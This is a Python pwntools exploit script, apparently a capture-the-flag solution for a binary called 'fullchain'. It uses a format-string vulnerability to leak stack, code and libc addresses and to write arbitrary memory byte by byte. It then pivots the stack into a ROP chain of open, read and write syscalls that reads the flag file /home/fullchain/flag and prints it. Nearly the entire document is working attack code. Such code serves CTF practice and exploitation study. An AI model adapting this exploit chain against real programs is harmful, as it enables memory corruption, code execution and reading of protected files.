from pwn import *

import time


# context.log_level = 'debug'

# %10$p rbp
# %11$p (chal+358)
p = process('./fullchain/share/fullchain')
# p = remote('127.0.0.1', 30201)
pause()

# Leak stack pointer
p.sendlineafter('> ', b'local')
p.sendlineafter('> ', b'write%10$p')

p.recvuntil(b'write') # Discard trash
stack_leak = int(p.recvuntil(b'g')[:-1], 16)
success(f'Stack Leak: {hex(stack_leak)}')

# Place count pointer
# offset_to_cnt = (stack_leak & 0xff) - 0x30
payload = b'A' * 0x10 + p64(stack_leak - 0x2a)
success(f'Count Address: {hex(stack_leak-0x2b)}')

p.sendlineafter('> ', b'local')
p.sendlineafter('> ', b'read')
time.sleep(0.05)
p.sendline(payload)

# Overwrite count
p.sendlineafter('> ', b'local')
p.sendlineafter('> ', b'write%16$n')

def do_overwrite(adr, value):
    to_write = value
    for i in range(8):
        # Prepare address.
        p.sendlineafter('local > ', b'local')
        p.sendlineafter('write > ', b'read')
        p.sendline(b'AAAAAAAA' + p64(adr+i))

        # Write byte.
        p.sendlineafter('local > ', b'global')
        p.sendlineafter('write > ', b'read')

        if (to_write & 0xff) == 0:
            p.sendline(b'%15$hhn')
        else:
            p.sendline(('%{}c%15$hhn'.format(str(to_write & 0xff))).encode())
        
        to_write >>= 8
        
        # Trigger fmt.
        p.sendlineafter('local > ', b'global')
        p.sendlineafter('write > ', b'write')

# Leak base
p.sendlineafter('> ', b'global')
p.sendlineafter('> ', b'read')
time.sleep(0.05)
p.sendline(b'%11$p')

p.sendlineafter('> ', b'global')
p.sendlineafter('> ', b'write')

code_leak = int(p.recvuntil(b'g')[:-1], 16)
code_base = code_leak - 0x172d
info(f'Code leak: {hex(code_leak)}')
success(f'Code base: {hex(code_base)}')

# Leak libc
do_overwrite(stack_leak, code_base+0x4020)

p.sendlineafter('> ', b'local')
p.sendlineafter('> ', b'write%18$s')
libc_base = u64(p.recvuntil(b'g')[5:-1].ljust(8, b'\x00')) - 0x186fa0
success(f'Libc base: {hex(libc_base)}')

# Gadgets
leave_ret = 0x000000000005aa48   + libc_base
pop_rax_ret = 0x000000000004a550 + libc_base
pop_rdi_ret = 0x0000000000026b72 + libc_base
pop_rsi_ret = 0x0000000000027529 + libc_base
pop_rdx_rbx_ret = 0x0000000000162866 + libc_base
syscall_ret = 0x0000000000066229 + libc_base

pause()
# /home/fullchain/flag
path = [8459501062736275503, 3417785034304875628, 1734437990]
do_overwrite(stack_leak+0x150, path[0])
do_overwrite(stack_leak+0x158, path[1])
do_overwrite(stack_leak+0x160, path[2])
#do_overwrite(stack_leak-0x2c, 2147483648)

do_overwrite(code_base+0x4070, leave_ret)

chain = [
    pop_rax_ret,     # Open
    2,
    pop_rdi_ret,
    stack_leak+0x150,
    pop_rsi_ret,
    0,
    pop_rdx_rbx_ret,
    0,
    0,
    syscall_ret,
    pop_rax_ret, # Read
    0,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    stack_leak + 0x180,
    pop_rdx_rbx_ret,
    0x50,
    0,
    syscall_ret,
    pop_rax_ret, # Write
    1,
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    stack_leak + 0x180,
    pop_rdx_rbx_ret,
    0x50,
    0,
    syscall_ret,
]

pivit = stack_leak
for i, c in enumerate(chain):
    pivit += 8
    info(f'Current chain entry: {i}')
    if c == 0:
        continue

    do_overwrite(pivit, c)
    

# Trigger
pause()


p.interactive()
